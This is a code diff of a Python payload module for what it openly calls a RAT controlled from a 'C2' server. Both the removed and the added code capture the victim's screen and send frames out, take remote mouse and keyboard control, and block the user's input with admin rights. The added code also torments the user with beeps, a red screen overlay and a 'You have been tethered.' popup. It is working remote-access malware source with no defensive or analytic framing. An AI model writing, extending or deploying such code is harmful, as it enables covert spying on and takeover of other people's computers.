@@ -3,99 +3,103 @@ from tkinter import messagebox
 import threading
 import time
 import winsound
-import json
-import asyncio
-import websockets
-from mss import mss
+import ctypes # For Block Input
+import pyautogui # For mouse/keyboard control
+import mss # For screen capture
+from io import BytesIO # To handle image data in memory
 from PIL import Image
-import pyautogui
-import io
-import ctypes
 
-# --- Global state variables ---
+# --- Global variables ---
 GUI_ROOT = None
-RAT_ACTIVE = False
+OVERLAY_WINDOW = None
+NOISE_ACTIVE = False
+OVERLAY_ACTIVE = False
+RAT_ACTIVE = False # New flag to control the RAT loop
+
+# --- NEW: Function to be called from comms.py for uploading frames ---
+RAT_UPLOAD_FUNC = None 
 
 def init_gui(root):
     global GUI_ROOT
     GUI_ROOT = root
 
-# --- Standard Live Actions ---
-def show_popup(text):
-    if GUI_ROOT: GUI_ROOT.after(0, lambda: messagebox.showinfo("System Alert", text))
-# ... (other non-RAT actions like noise, overlay would go here if needed) ...
+# --- NEW: RAT Core Logic ---
+def _rat_loop():
+    """The main loop for screen capturing and sending."""
+    with mss.mss() as sct:
+        while RAT_ACTIVE:
+            try:
+                # Capture the screen
+                sct_img = sct.shot(output=None, mon=-1) # mon=-1 captures all monitors
+                
+                # Convert to PIL Image to compress as JPEG in memory
+                img = Image.frombytes("RGB", (sct_img.width, sct_img.height), sct_img.rgb)
+                buffer = BytesIO()
+                img.save(buffer, format="JPEG", quality=75) # Start with 75% quality
+                frame_data = buffer.getvalue()
 
-def block_input_for_duration(seconds=5):
-    """Blocks user input for a specified duration. REQUIRES ADMIN."""
+                # Upload the frame using the function provided by comms.py
+                if RAT_UPLOAD_FUNC:
+                    RAT_UPLOAD_FUNC(frame_data)
+                
+                time.sleep(1) # Simple 1 FPS for now
+            except Exception as e:
+                print(f"[RAT ERROR] {e}")
+                time.sleep(5)
+
+def toggle_rat(upload_func):
+    """Starts or stops the RAT thread."""
+    global RAT_ACTIVE, RAT_UPLOAD_FUNC
+    RAT_ACTIVE = not RAT_ACTIVE
+    if RAT_ACTIVE:
+        RAT_UPLOAD_FUNC = upload_func
+        threading.Thread(target=_rat_loop, daemon=True).start()
+    return f"RAT toggled {'ON' if RAT_ACTIVE else 'OFF'}"
+
+def execute_mouse_click(x, y, button):
+    """Moves the mouse and performs a click."""
+    try:
+        # pyautogui needs screen dimensions to work correctly
+        screenWidth, screenHeight = pyautogui.size()
+        # Scale the coordinates from the C2's view to the target's screen size
+        target_x = int(screenWidth * x)
+        target_y = int(screenHeight * y)
+        pyautogui.click(x=target_x, y=target_y, button=button)
+    except Exception as e:
+        print(f"[MOUSE CLICK ERROR] {e}")
+
+def block_user_input(duration_seconds=5):
+    """Blocks mouse and keyboard input for a set duration."""
+    # This requires the payload to be running as an Administrator
     try:
         ctypes.windll.user32.BlockInput(True)
-        print(f"[*] Input blocked for {seconds} seconds.")
-        time.sleep(seconds)
+        print(f"[*] Input blocked for {duration_seconds} seconds.")
+        time.sleep(duration_seconds)
         ctypes.windll.user32.BlockInput(False)
         print("[*] Input unblocked.")
     except Exception as e:
-        print(f"[!] Failed to block input (requires admin rights): {e}")
+        print(f"[BLOCK INPUT ERROR] {e}")
 
-# --- RAT Session Logic ---
-async def rat_session(session_id, c2_url):
-    """The main loop for the remote desktop session."""
-    global RAT_ACTIVE
-    RAT_ACTIVE = True
-    
-    ws_url = c2_url.replace('https', 'wss') + f"/ws/rat/{session_id}"
-    print(f"[*] Starting RAT session. Connecting to {ws_url}")
-
-    async with websockets.connect(ws_url) as websocket:
-        print("[+] RAT WebSocket connected.")
-        
-        # Create two concurrent tasks: one for sending, one for receiving
-        recv_task = asyncio.create_task(receive_commands(websocket))
-        send_task = asyncio.create_task(send_frames(websocket))
-        
-        # Wait for either task to complete (which they shouldn't unless connection is lost)
-        await asyncio.wait([recv_task, send_task], return_when=asyncio.FIRST_COMPLETED)
-
-async def receive_commands(websocket):
-    """Listens for and executes commands from the C2."""
-    async for message in websocket:
-        try:
-            cmd = json.loads(message)
-            action = cmd.get("action")
-            
-            if action == "mouse_move":
-                pyautogui.moveTo(cmd['x'], cmd['y'])
-            elif action == "mouse_click":
-                pyautogui.click(button=cmd.get('button', 'left'))
-            elif action == "key_press":
-                pyautogui.press(cmd['key'])
-            elif action == "key_type":
-                pyautogui.typewrite(cmd['text'])
-            elif action == "block_input":
-                threading.Thread(target=block_input_for_duration, args=(5,)).start()
-                
-        except Exception:
-            pass # Ignore malformed commands
-
-async def send_frames(websocket):
-    """Captures and sends screen frames to the C2."""
-    quality = 75 # Default JPEG quality
-    scale = 1.0  # Default resolution scale (full)
-
-    with mss() as sct:
-        while RAT_ACTIVE:
-            monitor = sct.monitors[1] # Main monitor
-            
-            # Capture the screen
-            img = sct.grab(monitor)
-            img_pil = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
-            
-            # Apply performance settings (future implementation)
-            # For now, we use defaults
-            
-            # Convert to JPEG in memory
-            with io.BytesIO() as buffer:
-                img_pil.save(buffer, format="JPEG", quality=quality)
-                frame_data = buffer.getvalue()
-            
-            await websocket.send(frame_data)
-            await asyncio.sleep(1 / 15) # Cap at ~15 FPS
+# --- Existing functions (unchanged) ---
+def show_popup(text="You have been tethered."):
+    if GUI_ROOT: GUI_ROOT.after(0, lambda: messagebox.showinfo("System Alert", text))
+def _noise_loop():
+    while NOISE_ACTIVE: winsound.Beep(500, 200); time.sleep(0.5)
+def toggle_noise():
+    global NOISE_ACTIVE; NOISE_ACTIVE = not NOISE_ACTIVE
+    if NOISE_ACTIVE: threading.Thread(target=_noise_loop, daemon=True).start()
+    return f"Noise toggled {'ON' if NOISE_ACTIVE else 'OFF'}"
+def _create_overlay():
+    global OVERLAY_WINDOW;
+    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
+    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT); OVERLAY_WINDOW.attributes('-fullscreen', True); OVERLAY_WINDOW.attributes('-alpha', 0.2);
+    OVERLAY_WINDOW.attributes("-topmost", True); OVERLAY_WINDOW.configure(bg='red'); OVERLAY_WINDOW.overrideredirect(True)
+def _destroy_overlay():
+    global OVERLAY_WINDOW;
+    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy(); OVERLAY_WINDOW = None
+def toggle_screen_overlay():
+    global OVERLAY_ACTIVE; OVERLAY_ACTIVE = not OVERLAY_ACTIVE
+    if GUI_ROOT:
+        if OVERLAY_ACTIVE: GUI_ROOT.after(0, _create_overlay)
+        else: GUI_ROOT.after(0, _destroy_overlay)
+    return f"Overlay toggled {'ON' if OVERLAY_ACTIVE else 'OFF'}"
